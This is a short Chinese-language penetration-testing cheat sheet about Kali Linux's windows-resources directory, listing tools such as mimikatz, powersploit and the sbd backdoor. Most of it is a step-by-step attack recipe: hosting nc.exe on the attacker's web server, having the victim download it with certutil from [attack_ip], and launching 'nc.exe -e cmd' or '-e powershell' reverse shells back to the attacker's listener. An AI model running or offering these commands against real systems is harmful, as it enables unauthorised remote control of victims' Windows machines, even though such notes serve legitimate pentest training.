用于存放 windows 渗透工具

```shell
┌──(root㉿kali)-[~]
└─# windows-resources
```

```shell
/usr/share/windows-resources
├── binaries
├── dbd
├── hyperion
├── mimikatz
├── powershell-empire -> ../powershell-empire
├── powersploit
├── sbd
└── wce
```

```
binaries			用于渗透测试的 Windows 可执行文件
dbd					渗透测试的数据库工具
hyperion			生成和混淆 Metasploit 模块的工具
mimikatz			获取 Windows 系统密码哈希值的工具
powershell-empire	PowerShell 脚本
powersploit			PowerShell 脚本
sbd					在受控主机和攻击者之间建立加密的通信信道的 SBD（安装后门）工具
wce					获取 Windows 系统密码哈希值的工具
```

复制 `nc.exe` 到 `upload` 目录

```shell
┌──(root㉿kali)-[~]
└─# cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/upload/
```

开启 Web

```shell
┌──(root㉿kali-23)-[~]
└─# sudo systemctl start apache2.service && sudo systemctl status apache2.service
```

监听端口

```shell
┌──(root㉿kali-23)-[~]
└─# nc -lvnp [attack_port]
```

受害者下载 `nc.exe` 

```cmd
C:\Users\sec\Downloads>certutil -urlcache -split -f http://[attack_ip]/upload/nc.exe [nc_path]
```

CMD 反弹 Shell

```powershell
PS C:\Users\Administrator> C:\Users\sec\Downloads\nc.exe -e cmd [attack_ip] [attack_port]
```

PowerShell 反弹 Shell

```powershell
PS C:\Users\Administrator> C:\Users\sec\Downloads\nc.exe -e powershell [attack_ip] [attack_port]
```

---

参考链接

- [windows-resources](https://www.kali.org/tools/windows-binaries/#windows-resources)
